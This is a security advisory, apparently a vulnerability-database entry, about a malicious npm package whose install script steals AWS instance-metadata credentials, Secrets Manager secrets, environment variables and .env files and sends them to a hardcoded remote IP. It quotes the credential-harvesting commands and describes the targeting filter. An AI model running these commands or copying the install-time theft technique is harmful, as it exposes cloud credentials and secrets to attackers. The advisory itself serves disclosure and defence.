summary: coral-wraith postinstall exfiltrates AWS IMDS credentials and Secrets Manager contents to hardcoded remote IP
details: On `npm install`, postinstall.js executes automatically and performs credential theft and data exfiltration against the installer host. The script obtains an IMDSv2 token via `curl -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/`, exports the retrieved IAM role credentials, then iterates every secret returned by `aws secretsmanager list-secrets` and dumps the plaintext via `aws secretsmanager get-secret-value --secret-id $s`. It additionally scrapes environment variables, harvests files under `/home/node` and `.env`, and greps for `HTB{...}` flag strings. The collected payload is HTTP PUT'd to a hardcoded remote endpoint (`http://154.57.164.71:30782`) declared in `postinstall.js:5` alongside a loopback target. Execution is gated to hosts whose hostname matches `/^[0-9a-f]{12}$/` (a default Docker container ID) and excludes 'ubuntu'/'hetzner'/'nijin' substrings — a targeting filter that still hits any CI runner or container using the default hex hostname. Classic install-time credential-stealer with severe blast radius for any EC2/container environment that runs `npm install` with an IAM role attached.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
